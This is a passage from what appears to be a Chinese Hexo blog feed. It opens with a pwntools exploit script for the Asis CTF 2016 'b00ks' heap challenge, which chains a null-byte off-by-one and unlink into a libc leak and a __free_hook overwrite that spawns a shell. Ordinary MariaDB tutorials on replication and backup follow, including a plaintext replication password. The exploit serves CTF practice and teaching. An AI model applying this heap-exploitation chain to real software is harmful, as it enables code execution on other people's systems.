class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">'./b00ks'</span>)</span><br><span class="line">binary = ELF(<span class="string">"b00ks"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createbook</span><span class="params">(name_size, name, des_size, des)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(name_size))</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(des_size))</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Auther Name</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createname</span><span class="params">(name)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"name: "</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Change Auther name</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changename</span><span class="params">(name)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"5"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Edit book's description</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editbook</span><span class="params">(book_id, new_des)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.writeline(str(book_id))</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(new_des)</span><br><span class="line"></span><br><span class="line"><span class="comment">#delete book by id</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deletebook</span><span class="params">(book_id)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(book_id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">createname(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">createbook(<span class="number">0x20</span>,<span class="string">'a'</span>,<span class="number">0x20</span>,<span class="string">'b'</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">'4'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Author:'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">book1_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">book1_addr = u64(book1_addr.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_base = book1_addr - <span class="number">0x1080</span></span><br><span class="line"></span><br><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'buf 1'</span>, <span class="number">0x20</span>, <span class="string">'desc buf'</span>) <span class="comment"># 2</span></span><br><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'buf 2'</span>, <span class="number">0x20</span>, <span class="string">'desc buf 2'</span>) <span class="comment"># 3</span></span><br><span class="line">deletebook(<span class="number">2</span>)</span><br><span class="line">deletebook(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">ptr = heap_base + <span class="number">0x1180</span></span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x101</span>) </span><br><span class="line">payload += p64(ptr - <span class="number">0x18</span>) </span><br><span class="line">payload += p64(ptr - <span class="number">0x10</span>) </span><br><span class="line">payload += <span class="string">'\x00'</span> * <span class="number">0xe0</span> </span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'name'</span>, <span class="number">0x108</span>, <span class="string">'overflow'</span>) <span class="comment"># 4</span></span><br><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'name'</span>, <span class="number">0x100</span> - <span class="number">0x10</span>, <span class="string">'target'</span>) <span class="comment"># 5</span></span><br><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>, <span class="number">0x200</span>, <span class="string">'to arbitrary read write'</span>) <span class="comment"># 6</span></span><br><span class="line">editbook(<span class="number">4</span>, payload) <span class="comment"># overflow</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">deletebook(<span class="number">5</span>) <span class="comment"># unlink</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x11a0</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x10c0</span>)</span><br><span class="line">payload += <span class="string">'\n'</span></span><br><span class="line"></span><br><span class="line">editbook(<span class="number">4</span>,payload) </span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to</span><span class="params">(addr, content, size)</span>:</span></span><br><span class="line">    editbook(<span class="number">4</span>, p64(addr))</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    editbook(<span class="number">6</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_at</span><span class="params">(addr)</span>:</span></span><br><span class="line">    editbook(<span class="number">4</span>, p64(addr)) </span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">    content = io.recvline()[:<span class="number">-1</span>]</span><br><span class="line">    io.info(content)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">libc_leak = u64(read_at(heap_base + <span class="number">0x11e0</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">io.info(<span class="string">'libc leak  0x%x'</span> % libc_leak)</span><br><span class="line"></span><br><span class="line">write_to(libc_leak + libc.symbols[<span class="string">'__free_hook'</span>], p64(libc_leak + libc.symbols[<span class="string">'system'</span>]), <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">deletebook(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;许久没有练习pwn题了，今天拿一道堆题练练手，漏洞点在Null byte off-by-one以及unlink。&lt;/p&gt;
&lt;p&gt;题目来源(包括exp)：Asis CTF 2016 &lt;a href=&quot;https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;b00ks&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="http://yoursite.com/categories/Pwn/"/>
    
    
      <category term="unlink" scheme="http://yoursite.com/tags/unlink/"/>
    
      <category term="off-by-one" scheme="http://yoursite.com/tags/off-by-one/"/>
    
  </entry>
  
  <entry>
    <title>mariadb-主从复制</title>
    <link href="http://yoursite.com/2020/02/23/mariadb-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"/>
    <id>http://yoursite.com/2020/02/23/mariadb-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/</id>
    <published>2020-02-23T08:41:18.000Z</published>
    <updated>2020-02-23T08:42:36.320Z</updated>
    
    <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>mysql复制是指从一个mysql服务器(MASTER)将数据通过日志的方式经过网络传送到另一台或多台mysql服务器(SLAVE)，然后在slave上重放(replay或redo)传送过来的日志，以达到和master数据同步的目的。</p><a id="more"></a><p>它的工作原理很简单。首先确保master数据库上开启了二进制日志，这是复制的前提。</p><ul><li>在slave准备开始复制时，首先要执行change master to语句设置连接到master服务器的连接参数，在执行该语句的时候要提供一些信息，包括如何连接和要从哪复制binlog，这些信息在连接的时候会记录到slave的datadir下的master.info文件中，以后再连接master的时候将不用再提供这新信息而是直接读取该文件进行连接。</li><li>在slave上有两种线程，分别是IO线程和SQL线程<ul><li>IO线程用于连接master，监控和接受master的binlog。当启动IO线程成功连接master时，master会同时启动一个dump线程，该线程将slave请求要复制的binlog给dump出来，之后IO线程负责监控并接收master上dump出来的二进制日志，当master上binlog有变化的时候，IO线程就将其复制过来并写入到自己的中继日志(relay log)文件中。</li><li>slave上的另一个线程SQL线程用于监控、读取并重放relay log中的日志，将数据写入到自己的数据库中。</li></ul></li></ul><p>从复制的机制上可以知道，在复制进行前，slave上必须具有master上部分完整内容作为复制基准数据。例如，master上有数据库A，二进制日志已经写到了pos1位置，那么在复制进行前，slave上必须要有数据库A，且如果要从pos1位置开始复制的话，还必须有和master上pos1之前完全一致的数据。如果不满足这样的一致性条件，那么在replay中继日志的时候将不知道如何进行应用而导致数据混乱。也就是说，复制是基于binlog的position进行的，复制之前必须保证position一致。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="同步复制"><a href="#同步复制" class="headerlink" title="同步复制"></a>同步复制</h4><p>客户端发送DDL/DML语句给master，master执行完毕后还需要等待所有的slave都写完了relay log才认为此次DDL/DML成功，然后才会返回成功信息给客户端。同步复制的问题是master必须等待，所以延迟较大，在MySQL中不使用这种复制方式。</p><h4 id="半同复制"><a href="#半同复制" class="headerlink" title="半同复制"></a>半同复制</h4><p>客户端发送DDL/DML语句给master，master执行完毕后还要等待一个slave写完relay log并返回确认信息给master，master才认为此次DDL/DML语句是成功的，然后才会发送成功信息给客户端。半同步复制只需等待一个slave的回应，且等待的超时时间可以设置，超时后会自动降级为异步复制，所以在局域网内(网络延迟很小)使用半同步复制是可行的。</p><h4 id="异步复制"><a href="#异步复制" class="headerlink" title="异步复制"></a>异步复制</h4><p>客户端发送DDL/DML语句给master，master执行完毕立即返回成功信息给客户端，而不管slave是否已经开始复制。这样的复制方式导致的问题是，当master写完了binlog，而slave还没有开始复制或者复制还没完成时，slave上和master上的数据暂时不一致，且此时master突然宕机，slave将会丢失一部分数据。如果此时把slave提升为新的master，那么整个数据库就永久丢失这部分数据。</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><ol><li>为master和slave设定不同的server-id，这是主从复制结构中非常关键的标识号。到了MySQL 5.7，似乎不设置server id就无法开启binlog。设置server id需要重启MySQL实例。</li><li>开启master的binlog。刚安装并初始化的MySQL默认未开启binlog，建议手动设置binlog且为其设定文件名，否则默认以主机名为基名时修改主机名后会找不到日志文件。</li><li>最好设置master上的变量sync_binlog=1(MySQL 5.7.7之后默认为1，之前的版本默认为0)，这样每写一次二进制日志都将其刷新到磁盘，让slave服务器可以尽快地复制。防止万一master的二进制日志还在缓存中就宕机时，slave无法复制这部分丢失的数据。</li><li>最好设置master上的redo log的刷盘变量innodb_flush_log_at_trx_commit=1(默认值为1)，这样每次提交事务都会立即将事务刷盘保证持久性和一致性。</li><li>在slave上开启中继日志relay log。这个是默认开启的，同样建议手动设置其文件名。</li><li>建议在master上专门创建一个用于复制的用户，它只需要有复制权限replication slave用来读取binlog。</li><li>确保slave上的数据和master上的数据在”复制的起始position之前”是完全一致的。如果master和slave上数据不一致，复制会失败。</li><li>记下master开始复制前binlog的position，因为在slave连接master时需要指定从master的哪个position开始复制。</li><li>考虑是否将slave设置为只读，也就是开启read_only选项。这种情况下，除了具有super权限(mysql 5.7.16还提供了super_read_only禁止super的写操作)和SQL线程能写数据库，其他用户都不能进行写操作。这种禁写对于slave来说，绝大多数场景都非常适合。</li></ol><h4 id="一主一从"><a href="#一主一从" class="headerlink" title="一主一从"></a>一主一从</h4><p>主：192.168.163.132</p><p>从：192.168.163.135</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#slave配置</span></span><br><span class="line">[server]</span><br><span class="line">log_bin=mysql-bin</span><br><span class="line">relay-log=slave-bin</span><br><span class="line">server-id=111</span><br><span class="line"></span><br><span class="line"><span class="comment">#master配置</span></span><br><span class="line">[server]</span><br><span class="line">log_bin=master-bin</span><br><span class="line">sync-binlog=1</span><br><span class="line">server-id=100</span><br><span class="line"></span><br><span class="line"><span class="comment">#master创建用于复制的用户，并授予复制权限</span></span><br><span class="line">create user <span class="string">'repl'</span>@<span class="string">'192.168.163.%'</span> identified by <span class="string">'dqy751421'</span>;</span><br><span class="line">grant REPLICATION SLAVE on *.* to <span class="string">'repl'</span>@<span class="string">'192.168.163.%'</span>;</span><br></pre></td></tr></table></figure><h5 id="备份数据"><a href="#备份数据" class="headerlink" title="备份数据"></a>备份数据</h5><p>如果待复制的master上已有数据，那么先要将这些数据备份到slave上，并获取master上的二进制日志的当前坐标，从而使得slave重做relay log时不会出错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#创建master数据</span><br><span class="line">DROP DATABASE IF EXISTS backuptest;</span><br><span class="line">CREATE DATABASE backuptest;</span><br><span class="line">USE backuptest;</span><br><span class="line"></span><br><span class="line"># 创建myisam类型的数值辅助表和插入数据的存储过程</span><br><span class="line">CREATE TABLE num_isam (n INT NOT NULL PRIMARY KEY) ENGINE &#x3D; MYISAM ;</span><br><span class="line"></span><br><span class="line">DROP PROCEDURE IF EXISTS proc_num1;</span><br><span class="line">DELIMITER $$</span><br><span class="line">CREATE PROCEDURE proc_num1 (num INT) </span><br><span class="line">BEGIN</span><br><span class="line">    DECLARE rn INT DEFAULT 1 ;</span><br><span class="line">    TRUNCATE TABLE backuptest.num_isam ;</span><br><span class="line">    INSERT INTO backuptest.num_isam VALUES(1) ;</span><br><span class="line">    dd: WHILE rn * 2 &lt; num DO </span><br><span class="line">        BEGIN</span><br><span class="line">            INSERT INTO backuptest.num_isam </span><br><span class="line">            SELECT rn + n FROM backuptest.num_isam;</span><br><span class="line">            SET rn &#x3D; rn * 2 ;</span><br><span class="line">        END ;</span><br><span class="line">    END WHILE dd;</span><br><span class="line">    INSERT INTO backuptest.num_isam </span><br><span class="line">    SELECT n + rn </span><br><span class="line">    FROM backuptest.num_isam </span><br><span class="line">    WHERE n + rn &lt;&#x3D; num;</span><br><span class="line">END ;</span><br><span class="line">$$</span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"># 创建innodb类型的数值辅助表和插入数据的存储过程</span><br><span class="line">CREATE TABLE num_innodb (n INT NOT NULL PRIMARY KEY) ENGINE &#x3D; INNODB ;</span><br><span class="line"></span><br><span class="line">DROP PROCEDURE IF EXISTS proc_num2;</span><br><span class="line">DELIMITER $$</span><br><span class="line">CREATE PROCEDURE proc_num2 (num INT) </span><br><span class="line">BEGIN</span><br><span class="line">    DECLARE rn INT DEFAULT 1 ;</span><br><span class="line">    TRUNCATE TABLE backuptest.num_innodb ;</span><br><span class="line">    INSERT INTO backuptest.num_innodb VALUES(1) ;</span><br><span class="line">    dd: WHILE rn * 2 &lt; num DO </span><br><span class="line">        BEGIN</span><br><span class="line">            INSERT INTO backuptest.num_innodb </span><br><span class="line">            SELECT rn + n FROM backuptest.num_innodb;</span><br><span class="line">            SET rn &#x3D; rn * 2 ;</span><br><span class="line">        END ;</span><br><span class="line">    END WHILE dd;</span><br><span class="line">    INSERT INTO backuptest.num_innodb </span><br><span class="line">    SELECT n + rn </span><br><span class="line">    FROM backuptest.num_innodb </span><br><span class="line">    WHERE n + rn &lt;&#x3D; num ;</span><br><span class="line">END ;</span><br><span class="line">$$</span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"># 分别向两个数值辅助表中插入100W条数据</span><br><span class="line">CALL proc_num1 (1000000) ;</span><br><span class="line">CALL proc_num2 (1000000) ;</span><br></pre></td></tr></table></figure><p>获取当前position位置，为了安全起见先锁表，此时无法进行commit操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#锁表</span><br><span class="line">flush tables with read lock;</span><br><span class="line"></span><br><span class="line">#查看二进制日志的position位置</span><br><span class="line">show master status;</span><br><span class="line">+-------------------+----------+--------------+------------------+</span><br><span class="line">| File              | Position | Binlog_Do_DB | Binlog_Ignore_DB |</span><br><span class="line">+-------------------+----------+--------------+------------------+</span><br><span class="line">| master-bin.000001 |    14872 |              |                  |</span><br><span class="line">+-------------------+----------+--------------+------------------+</span><br></pre></td></tr></table></figure><p>备份数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysqldump --all-databases --single-transaction --master-data=2 &gt;dump.db</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看大小</span></span><br><span class="line">ls -lh dump.db </span><br><span class="line">-rw-r--r-- 1 root root 22M Feb 23 03:02 dump.db</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看对应二进制日志坐标，即上文查看的坐标</span></span><br><span class="line">grep -i -m 1 <span class="string">'change master to'</span> dump.db</span><br></pre></td></tr></table></figure><p>在slave上导入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#复制</span></span><br><span class="line">ansible 192.168.163.135 -m copy -a <span class="string">'src=./dump.db dest=/root/dump.db'</span></span><br><span class="line"><span class="comment">#导入</span></span><br><span class="line">mysql&lt;dump.db</span><br></pre></td></tr></table></figure><h5 id="slave开启复制"><a href="#slave开启复制" class="headerlink" title="slave开启复制"></a>slave开启复制</h5><p>在slave端执行指向master，需要配置如下数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#从未连接过master需要配置如下</span><br><span class="line">change master to</span><br><span class="line">    -&gt; master_host&#x3D;&#39;192.168.163.132&#39;,</span><br><span class="line">    -&gt; master_port&#x3D;3306,</span><br><span class="line">    -&gt; master_user&#x3D;&#39;repl&#39;,</span><br><span class="line">    -&gt; master_password&#x3D;&#39;dqy751421&#39;,</span><br><span class="line">    -&gt; master_log_file&#x3D;&#39;master-bin.000001&#39;,# 指明需要复制的binlog文件</span><br><span class="line">    -&gt; master_log_pos&#x3D;14872;# 指明binlog的position</span><br><span class="line">    </span><br><span class="line">#该指令执行后会在数据库目录创建两个文件master.info和relay-log.info</span><br><span class="line">master.info文件记录的是IO线程相关的信息，也就是连接master以及读取master binlog的信息。通过这个文件，下次连接master时就不需要再提供连接选项。</span><br><span class="line">relay-log.info文件中记录的是SQL线程相关的信息</span><br></pre></td></tr></table></figure><p>启动两个进程后便正常开始主从复制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#一次性启动&#x2F;关闭</span><br><span class="line">start slave&#x2F;stop;</span><br><span class="line">#分开启动</span><br><span class="line">start slave io_thread;</span><br><span class="line">start slave sql_thread;</span><br></pre></td></tr></table></figure><p>master.info文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">18<span class="comment"># 本文件的行数</span></span><br><span class="line">master-bin.000001<span class="comment"># IO线程正从哪个master binlog读取日志</span></span><br><span class="line">15366<span class="comment"># IO线程读取到master binlog的位置</span></span><br><span class="line">192.168.163.132<span class="comment"># master_host</span></span><br><span class="line">repl<span class="comment"># master_user</span></span><br><span class="line">dqy751421<span class="comment"># master_password</span></span><br><span class="line">3306<span class="comment"># master_port</span></span><br><span class="line">60<span class="comment"># slave重连master的超时时长</span></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">1800.000</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>relay-log.info文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./slave-bin.000002<span class="comment"># 当前SQL线程正在读取的relay-log文件</span></span><br><span class="line">1024<span class="comment"># SQL线程已执行到的relay log位置</span></span><br><span class="line">master-bin.000001<span class="comment"># SQL线程最近执行的操作对应的是哪个master binlog</span></span><br><span class="line">15366<span class="comment"># SQL线程最近执行的操作对应的是master binlog的哪个位置</span></span><br></pre></td></tr></table></figure><p>查看slave状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show slave status\G;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;mysql复制是指从一个mysql服务器(MASTER)将数据通过日志的方式经过网络传送到另一台或多台mysql服务器(SLAVE)，然后在slave上重放(replay或redo)传送过来的日志，以达到和master数据同步的目的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="mariadb" scheme="http://yoursite.com/categories/mariadb/"/>
    
    
      <category term="mysql" scheme="http://yoursite.com/tags/mysql/"/>
    
      <category term="mariadb" scheme="http://yoursite.com/tags/mariadb/"/>
    
  </entry>
  
  <entry>
    <title>mariadb-备份</title>
    <link href="http://yoursite.com/2020/02/23/mariadb-%E5%A4%87%E4%BB%BD/"/>
    <id>http://yoursite.com/2020/02/23/mariadb-%E5%A4%87%E4%BB%BD/</id>
    <published>2020-02-23T08:40:51.000Z</published>
    <updated>2020-02-23T08:42:26.611Z</updated>
    
    <content type="html"><![CDATA[<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>完全备份：备份整个数据集合</p><p>增量备份：仅备份最近一次完全备份或增量备份以来变化的数据</p><p>差异备份：仅备份最近一次完全备份以来变化的数据</p><a id="more"></a><p>热备份：备份过程中读写操作均可执行</p><p>温备份：读操作可执行，但写操作不能执行</p><p>冷备份：读写操作均不可执行</p><p>物理备份：直接复制数据文件进行备份，还原快，但是占空间大</p><p>逻辑备份：从数据库中“导出”数据另存而进行的备份，即导出sql语句，与存储引擎无关，还原慢但是占空间小</p><h3 id="备份工具"><a href="#备份工具" class="headerlink" title="备份工具"></a>备份工具</h3><p>mysqldump：逻辑备份工具，适用于所有存储引擎，支持温备、完全备份、部分备份；对InnoDB存储引擎支持热备</p><p>cp，tar：物理备份工具，复制归档工具，适用于所有存储引擎，只支持冷备、完全备份、部分备份</p><p>lvm2快照：几乎热备(需要锁拍快照)，借助于文件系统管理工具进行备份</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLUSH TABLES WITH READ LOCK;</span><br></pre></td></tr></table></figure><p>mysqlhotcopy：几乎冷备，仅适用于MyISAM存储引擎</p><p>xtrabackup：支持InnoDB热备(物理备份)，支持完全备份、增量备份</p><h3 id="逻辑备份"><a href="#逻辑备份" class="headerlink" title="逻辑备份"></a>逻辑备份</h3><p>该备份方式会将schema和数据存储在一起，这样会导致巨大的SQL语句，会形成巨大的单个备份文件。</p><h4 id="mysqldump"><a href="#mysqldump" class="headerlink" title="mysqldump"></a>mysqldump</h4><p>连接至mysql服务器后通过全量扫描进行备份。</p><p>mysqldump备份innodb表时因为要加–single-transaction，会自动将隔离级别设置为repeatable read并开启一个事务，这时mysqldump将获取dump执行前一刻的行版本，并处于一个长事务中直到dump结束。所以不影响目标数据库的使用，可读也可写，即实现的是热备。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#备份数据库下的所有表，不包含数据库自身</span></span><br><span class="line">mysqldump [option] db_name [tbl_name...]</span><br><span class="line"><span class="comment">#备份指定数据库，包含数据库自身和其内的所有表</span></span><br><span class="line">mysqldump [option] --databases db_name...</span><br><span class="line"><span class="comment">#备份所有库，同上</span></span><br><span class="line">mysqldump [option] --all-databases</span><br><span class="line"></span><br><span class="line"><span class="comment">#其他option</span></span><br><span class="line">-E,--events：备份指定数据库相关的所有event schedule</span><br><span class="line">-R,--routines：备份指定数据库相关的所有存储过程和存储函数</span><br><span class="line">--triggers：备份表相关的触发器</span><br></pre></td></tr></table></figure><p>对于MyISAM引擎来说，只支持温备；需要锁定备份库后启动备份操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 